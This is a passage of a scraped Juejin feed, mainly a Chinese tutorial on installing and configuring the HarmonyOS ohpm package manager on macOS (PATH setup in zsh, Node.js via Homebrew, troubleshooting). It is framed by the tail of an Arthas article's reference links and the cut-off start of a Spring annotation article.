%25E6%25A0%25B8%25E5%25BF%2583%25E6%25A8%25A1%25E5%259D%2597%25EF%25BC%259A%25E5%25AE%25A2%25E6%2588%25B7%25E7%25AB%25AF%25E3%2580%2581%25E6%259C%258D%25E5%258A%25A1%25E7%25AB%25AF%25E3%2580%2581%25E4%25BB%25A3%25E7%2590%2586%25E7%25AB%25AF%25EF%25BC%258C%25E5%2590%2584%25E6%25A8%25A1%25E5%259D%2597%25E8%2581%258C%25E8%25B4%25A3%25E6%25B8%2585%25E6%2599%25B0%25EF%25BC%258C%25E5%258D%258F%25E5%2590%258C%25E5%25B7%25A5%25E4%25BD%259C%25E5%25AE%259E%25E7%258E%25B0%25E8%25AF%258A%25E6%2596%25AD%25E5%258A%259F%25E8%2583%25BD%25E3%2580%2582%2520%25E6%2594%25AF%25E6%258C%2581%25E5%2591%25BD%25E4%25BB%25A4%25E8%25A1%25A5%25E5%2585%25A8%25E3%2580%2581%25E5%258E%2586%25E5%258F%25B2%25E8%25AE%25B0%25E5%25BD%2595%25E3%2580%2581%25E7%25BB%2593%25E6%259E%259C%25E6%25A0%25BC%25E5%25BC%258F%25E5%258C%2596%25E5%25B1%2595%25E7%25A4%25BA%25E3%2580%2582%2520%25E5%25B0%2586%25E9%2587%2587%25E9%259B%2586%25E5%2588%25B0%25E7%259A%2584%25E6%2595%25B0%25E6%258D%25AE%25E6%25A0%25BC%25E5%25BC%258F%25E5%258C%2596%25E5%2590%258E%25E8%25BF%2594%25E5%259B%259E%25E5%25AE%25A2%25E6%2588%25B7%25E7%25AB%25AF%25E3%2580%2582%2520%25E6%2594%25AF%25E6%258C%2581%25E7%25B1%25BB%25E9%2587%258D%25E5%25AE%259A%25E4%25B9%2589%25E3%2580%2581%25E7%25B1%25BB%25E5%258D%25B8%25E8%25BD%25BD%25E7%25AD%2589%25E6%25A0%25B8%25E5%25BF%2583%25E6%2593%258D%25E4%25BD%259C%25E3%2580%2582" target="_blank" title="https://blog.csdn.net/jam_yin/article/details/155359238#:~:text=Arthas%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E6%9C%AC%E8%B4%A8%E6%98%AF%E2%80%9CAttach%E6%9C%BA%E5%88%B6%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%90%86%20%2B%20Instrumentation%E5%AE%9E%E7%8E%B0%E5%AD%97%E8%8A%82%E7%A0%81%E5%A2%9E%E5%BC%BA%E2%80%9D%E7%9A%84%E7%BB%84%E5%90%88%EF%BC%8C%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B%E5%A6%82%E4%B8%8B%EF%BC%9A%204.,Arthas%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84%E8%A7%A3%E6%9E%90%20Arthas%E9%87%87%E7%94%A8%E2%80%9C%E5%AE%A2%E6%88%B7%E7%AB%AF-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E2%80%9D%E6%9E%B6%E6%9E%84%EF%BC%8C%E5%88%86%E4%B8%BA%E4%B8%89%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97%EF%BC%9A%E5%AE%A2%E6%88%B7%E7%AB%AF%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E3%80%81%E4%BB%A3%E7%90%86%E7%AB%AF%EF%BC%8C%E5%90%84%E6%A8%A1%E5%9D%97%E8%81%8C%E8%B4%A3%E6%B8%85%E6%99%B0%EF%BC%8C%E5%8D%8F%E5%90%8C%E5%B7%A5%E4%BD%9C%E5%AE%9E%E7%8E%B0%E8%AF%8A%E6%96%AD%E5%8A%9F%E8%83%BD%E3%80%82%20%E6%94%AF%E6%8C%81%E5%91%BD%E4%BB%A4%E8%A1%A5%E5%85%A8%E3%80%81%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E3%80%81%E7%BB%93%E6%9E%9C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%B1%95%E7%A4%BA%E3%80%82%20%E5%B0%86%E9%87%87%E9%9B%86%E5%88%B0%E7%9A%84%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%90%8E%E8%BF%94%E5%9B%9E%E5%AE%A2%E6%88%B7%E7%AB%AF%E3%80%82%20%E6%94%AF%E6%8C%81%E7%B1%BB%E9%87%8D%E5%AE%9A%E4%B9%89%E3%80%81%E7%B1%BB%E5%8D%B8%E8%BD%BD%E7%AD%89%E6%A0%B8%E5%BF%83%E6%93%8D%E4%BD%9C%E3%80%82" ref="nofollow noopener noreferrer">blog.csdn.net/jam_yin/art…</a></p>
<p>项目启动报错：Redis health check failed:<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Fyl97%2Fp%2F14926029.html" target="_blank" title="https://www.cnblogs.com/yl97/p/14926029.html" ref="nofollow noopener noreferrer">www.cnblogs.com/yl97/p/1492…</a></p>
<p>Tunnel Server:<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.xiehai.zone%2Farthas%2Finstall%2Ftunnel.html" target="_blank" title="https://www.xiehai.zone/arthas/install/tunnel.html" ref="nofollow noopener noreferrer">www.xiehai.zone/arthas/inst…</a></p>
<p>《运维监控系统实战笔记》</p>
<p>实战开发 arthas-spring-boot-starter，监控你的微服务是否健康!：<a href="https://link.juejin.cn?target=https%3A%2F%2Fxie.infoq.cn%2Farticle%2F847786de8b6da553db8b018ce" target="_blank" title="https://xie.infoq.cn/article/847786de8b6da553db8b018ce" ref="nofollow noopener noreferrer">xie.infoq.cn/article/847…</a></p>
<p>一文带你整合arthas和springboot :<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fweixin_45642975%2Farticle%2Fdetails%2F148202414" target="_blank" title="https://blog.csdn.net/weixin_45642975/article/details/148202414" ref="nofollow noopener noreferrer">blog.csdn.net/weixin_4564…</a></p>
<p>spring boot 集成arthas实现线上远程监控调优 :<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F610030983" target="_blank" title="https://zhuanlan.zhihu.com/p/610030983" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/610030983</a></p>
<p>Arthas Tunnel:<a href="https://link.juejin.cn?target=https%3A%2F%2Farthas.aliyun.com%2Fdoc%2Ftunnel.html" target="_blank" title="https://arthas.aliyun.com/doc/tunnel.html" ref="nofollow noopener noreferrer">arthas.aliyun.com/doc/tunnel.…</a></p>
<p>本文使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkdown.com.cn" target="_blank" title="https://markdown.com.cn" ref="nofollow noopener noreferrer">markdown.com.cn</a> 排版</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[鸿蒙开发必备：macOS 上 ohpm 的完整安装与配置指南（从报错到成功）]]></title>    <link>https://juejin.cn/post/7581470169840812070</link>    <guid>https://juejin.cn/post/7581470169840812070</guid>    <pubDate>2025-12-09T05:52:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581470169840812070" data-draft-id="7581412054903373833" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 鸿蒙开发必备：macOS 上 ohpm 的完整安装与配置指南（从报错到成功）"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-09T05:52:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90后晨仔"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             鸿蒙开发必备：macOS 上 ohpm 的完整安装与配置指南（从报错到成功）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90后晨仔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:52:12.000Z" title="Tue Dec 09 2025 05:52:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🚀 引言：为什么需要 ohpm？</h2>
<p>在 iOS 开发中，我们用 <strong>CocoaPods</strong> 管理第三方库；在 Android 中，用 <strong>Gradle + Maven</strong>。<br/>
而在 <strong>鸿蒙（HarmonyOS）生态</strong>中，华为官方提供了 <strong>ohpm（OpenHarmony Package Manager）</strong> —— 这是管理 HarmonyOS 第三方组件（如 Lottie 动画、网络库、UI 组件等）的<strong>标准工具</strong>。</p>
<p>但许多 macOS 开发者在首次使用 <code>ohpm</code> 时，会遇到各种“命令未找到”、“node not found”等问题。本文将<strong>从零开始</strong>，带你一步步排查并成功配置 ohpm，确保你的 DevEco Studio 项目能顺利集成三方库。</p>
<hr/>
<h2 data-id="heading-1">🔧 第一步：确认 DevEco Studio 已正确安装</h2>
<p>ohpm 是 <strong>DevEco Studio 自带的命令行工具</strong>，因此你必须先安装 DevEco Studio。</p>
<ul>
<li>
<p>下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdeveco-studio" target="_blank" title="https://developer.huawei.com/consumer/cn/deveco-studio" ref="nofollow noopener noreferrer">developer.huawei.com/consumer/cn…</a></p>
</li>
<li>
<p>安装时请确保勾选：</p>
<ul>
<li><strong>HarmonyOS SDK</strong></li>
<li><strong>Command-line Tools</strong></li>
</ul>
</li>
</ul>
<blockquote>
<p>💡 安装完成后，应用通常位于 <code>/Applications/DevEco-Studio.app</code>（注意名称可能含连字符 <code>-</code>）</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">🔍 第二步：定位 ohpm 的真实路径（关键！）</h2>
<p>很多教程直接写死路径为 <code>/Applications/DevEco Studio.app/...</code>，但<strong>实际路径因版本和安装方式而异</strong>。</p>
<h3 data-id="heading-3">✅ 正确做法：用 <code>find</code> 命令查找</h3>
<pre><code class="hljs language-javascript" lang="javascript">find /<span class="hljs-title class_">Applications</span> -name ohpm <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>
</code></pre>
<p>典型输出：</p>
<pre><code class="hljs language-bash" lang="bash">/Applications/DevEco-Studio.app/Contents/tools/ohpm
/Applications/DevEco-Studio.app/Contents/tools/ohpm/bin/ohpm   ← 可执行文件在此！
</code></pre>
<blockquote>
<p>⚠️ 注意：</p>
<ul>
<li>应用名可能是 <code>DevEco-Studio.app</code>（带连字符），不是 <code>DevEco Studio.app</code></li>
<li><code>ohpm</code> 可执行文件在 <code>.../tools/ohpm/bin/</code> 目录下，<strong>不是 <code>.../tools/bin/</code></strong></li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-4">📂 第三步：配置 shell 环境变量（zsh）</h2>
<p>macOS Catalina（10.15）及以后默认使用 <strong>zsh</strong>，配置文件为 <code>~/.zshrc</code>。</p>
<h3 data-id="heading-5">1. 编辑 <code>~/.zshrc</code></h3>
<pre><code class="hljs language-shell" lang="shell">nano ~/.zshrc
</code></pre>
<h3 data-id="heading-6">2. 添加以下内容（根据你的实际路径调整）</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">Android SDK（某些混合项目需要，可选）</span>
export ANDROID_HOME="$HOME/Library/Android/sdk"
export PATH="$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools"
<span class="hljs-meta prompt_">
# </span><span class="bash">DevEco Studio 内置 Node.js（方案二备用，推荐用 Homebrew）</span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"/Applications/DevEco-Studio.app/Contents/tools/nodejs/bin:<span class="hljs-variable">$PATH</span>"</span></span>
<span class="hljs-meta prompt_">
# </span><span class="bash">ohpm 可执行文件路径（关键！）</span>
export PATH="$PATH:/Applications/DevEco-Studio.app/Contents/tools/ohpm/bin"
<span class="hljs-meta prompt_">
# </span><span class="bash">Homebrew（确保 brew 命令可用）</span>
eval "$(/opt/homebrew/bin/brew shellenv)"
<span class="hljs-meta prompt_">
# </span><span class="bash">JetBrains VM options（DevEco Studio 自动添加，保留即可）</span>
___MY_VMOPTIONS_SHELL_FILE="${HOME}/.jetbrains.vmoptions.sh"
if [ -f "${___MY_VMOPTIONS_SHELL_FILE}" ]; then
  . "${___MY_VMOPTIONS_SHELL_FILE}"
fi
</code></pre>
<blockquote>
<p>🔥 重点替换：</p>
<ul>
<li>将 <code>DevEco-Studio.app</code> 替换为你 <code>find</code> 命令查到的实际名称</li>
<li>路径必须是 <code>.../tools/ohpm/bin</code></li>
</ul>
</blockquote>
<h3 data-id="heading-7">3. 保存并重载</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">保存后退出 nano（Ctrl+O → Enter → Ctrl+X）</span>
source ~/.zshrc
</code></pre>
<hr/>
<h2 data-id="heading-8">🐘 第四步：安装 Node.js（解决 "node: command not found"）</h2>
<p>当你运行 <code>ohpm -v</code> 时，如果看到：</p>
<pre><code class="hljs language-bash" lang="bash">ERROR: node: <span class="hljs-built_in">command</span> not found
...
Failed to find the executable <span class="hljs-string">'node'</span> <span class="hljs-built_in">command</span>
</code></pre>
<p>说明 <strong>系统缺少 Node.js</strong>。虽然 DevEco Studio 内置了 Node，但<strong>不建议依赖它</strong>。</p>
<h3 data-id="heading-9">✅ 推荐方案：用 Homebrew 安装 Node.js</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 Node.js（包含 npm）</span>
brew install node
</code></pre>
<h3 data-id="heading-10">验证安装</h3>
<pre><code class="hljs language-bash" lang="bash">node -v   <span class="hljs-comment"># 输出如 v20.18.0</span>
npm -v    <span class="hljs-comment"># 输出如 10.8.2</span>
</code></pre>
<blockquote>
<p>✅ 优点：</p>
<ul>
<li>版本新、稳定</li>
<li>所有终端和 GUI 应用都能使用</li>
<li>符合华为官方推荐</li>
</ul>
</blockquote>
<h3 data-id="heading-11">❌ 不推荐方案：使用 DevEco 内置 Node</h3>
<p>如果你坚持不用 Homebrew，可取消注释 <code>.zshrc</code> 中的这行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"/Applications/DevEco-Studio.app/Contents/tools/nodejs/bin:<span class="hljs-variable">$PATH</span>"</span>
</code></pre>
<p>但需注意版本锁定和兼容性风险。</p>
<hr/>
<h2 data-id="heading-12">🧪 第五步：验证 ohpm 是否工作</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 检查路径</span>
<span class="hljs-built_in">which</span> ohpm
<span class="hljs-comment"># 应输出：/Applications/DevEco-Studio.app/Contents/tools/ohpm/bin/ohpm</span>

<span class="hljs-comment"># 2. 查看版本</span>
ohpm -v
<span class="hljs-comment"># 成功输出：2.0.0（或其他版本号）</span>

<span class="hljs-comment"># 3. 测试安装一个库</span>
ohpm install @ohos/lottie --save
</code></pre>
<p>如果看到 <code>Install success</code>，恭喜你！ohpm 已配置成功。</p>
<hr/>
<h2 data-id="heading-13">🖥 第六步：让 DevEco Studio GUI 也能识别环境变量</h2>
<p>即使终端中 <code>ohpm</code> 和 <code>ANDROID_HOME</code> 生效了，<strong>从 Dock 启动的 DevEco Studio 仍可能报错 “ANDROID_HOME not set”</strong> 。</p>
<h3 data-id="heading-14">原因：</h3>
<p>GUI 应用（如 DevEco Studio）<strong>不会读取 <code>~/.zshrc</code></strong>，只读取登录时加载的 <code>~/.zprofile</code>。</p>
<h3 data-id="heading-15">✅ 解决方案：</h3>
<p>将 <code>.zshrc</code> 中的环境变量<strong>同步到 <code>~/.zprofile</code></strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 复制配置</span>
<span class="hljs-built_in">cp</span> ~/.zshrc ~/.zprofile

<span class="hljs-comment"># 或手动编辑</span>
nano ~/.zprofile
</code></pre>
<p>然后 <strong>重启电脑</strong>，确保 <code>launchd</code> 加载新变量。</p>
<blockquote>
<p>💡 重启后，DevEco Studio 就不会再提示环境变量缺失了！</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">🛠 常见错误与排查</h2>






























<table><thead><tr><th>错误现象</th><th>原因</th><th>解决方案</th></tr></thead><tbody><tr><td><code>command not found: ohpm</code></td><td>PATH 路径错误或未生效</td><td>用 <code>find</code> 确认路径，检查 <code>.zshrc</code> 是否 <code>source</code></td></tr><tr><td><code>node: command not found</code></td><td>未安装 Node.js</td><td><code>brew install node</code></td></tr><tr><td>DevEco Studio 报 “ANDROID_HOME not set”</td><td>GUI 应用未继承变量</td><td>配置 <code>~/.zprofile</code> 并重启电脑</td></tr><tr><td><code>ohpm install</code> 卡住或超时</td><td>网络问题</td><td>设置国内源： <code>ohpm config set registry https://ohpm.openharmony.cn/ohpm/</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-17">📚 官方资源</h2>
<ul>
<li>ohpm 文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V5%2Fohpm-overview-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/ohpm-overview-V5" ref="nofollow noopener noreferrer">developer.huawei.com/consumer/cn…</a></li>
<li>公共组件市场：<a href="https://link.juejin.cn?target=https%3A%2F%2Fohpm.openharmony.cn%2F" target="_blank" title="https://ohpm.openharmony.cn/" ref="nofollow noopener noreferrer">ohpm.openharmony.cn</a></li>
<li>DevEco Studio 下载：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdeveco-studio" target="_blank" title="https://developer.huawei.com/consumer/cn/deveco-studio" ref="nofollow noopener noreferrer">developer.huawei.com/consumer/cn…</a></li>
</ul>
<hr/>
<h2 data-id="heading-18">✅ 总结：成功配置 ohpm 的 Checklist</h2>
<ul>
<li>用 <code>find /Applications -name ohpm</code> 确认真实路径</li>
<li>在 <code>~/.zshrc</code> 中正确设置 <code>PATH</code>（含 <code>.../tools/ohpm/bin</code>）</li>
<li>通过 <code>brew install node</code> 安装 Node.js</li>
<li>运行 <code>source ~/.zshrc</code> 使配置生效</li>
<li>验证 <code>ohpm -v</code> 输出版本号</li>
<li>将环境变量同步到 <code>~/.zprofile</code> 并<strong>重启电脑</strong></li>
</ul>
<hr/>
<h2 data-id="heading-19">🌟 结语</h2>
<p>鸿蒙生态正在快速发展，而 <strong>ohpm 是连接你与丰富三方组件的桥梁</strong>。虽然初期配置稍显繁琐，但一旦打通，你就能像使用 CocoaPods 一样轻松集成动画、网络、工具类库。</p>
<p>希望这篇博客能帮助你少走弯路，快速进入 HarmonyOS 开发的正轨！</p>
<blockquote>
<p><strong>Happy Coding with HarmonyOS!</strong> 🍀<br/>
如果你成功了，欢迎在评论区分享你的经验；如果仍有问题，也请留言，我会尽力解答。</p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[@PathVariable 和 @RequestParam 的区别]]></title>    <link>https://juejin.cn/post/7581324707481698345</link>    <guid>https://juejin.cn/post/7581324707481698345</guid>    <pubDate>2025-12-09T05:47:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581324707481698345" data-draft-id="7581381365494825014" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="@PathVariable 和 @RequestParam 的区别"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-09T05:47:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我是天龙_绍"/> <meta itemprop="url" content="https://juejin.cn/user/1831109918994644"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            @PathVariable 和 @RequestParam 的区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1831109918994644/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我是天龙_绍
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:47:33.000Z" title="Tue Dec 09 2025 05:47:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 